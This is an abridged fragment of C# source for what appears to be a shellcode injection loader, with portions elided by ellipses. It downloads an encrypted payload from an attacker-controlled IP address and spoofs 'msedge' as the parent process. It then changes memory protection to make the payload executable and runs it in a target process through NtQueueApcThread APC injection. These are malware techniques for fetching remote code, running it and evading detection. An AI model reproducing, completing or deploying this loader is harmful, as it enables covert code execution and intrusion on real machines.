...
namespace DynamicInvoke {
  public static class Program {
    // Define target process properties, example: MS Edge
    ...
    // Define parent process of the target process
    public static string parentProc = "msedge";
    ...
    public static void Main(string[] args) {
      ...
      using(var client = new WebClient()) {
        ...
        encryptedData = client.DownloadData("http://192.168.100.120/encrypted.bin");
      }
      ...
      try {
        ...
        var parentHandle = Process.GetProcessesByName(parentProc)[0].Handle;
      ...
      // Change protection to execute payload
      ...
      // QueueUserAPC: Set the initial thread of the target process poiting to the payload
      status = NtQueueApcThread(pi.hThread, BaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
      Console.WriteLine("[*] APC called");

      // Resume Thread on the target process
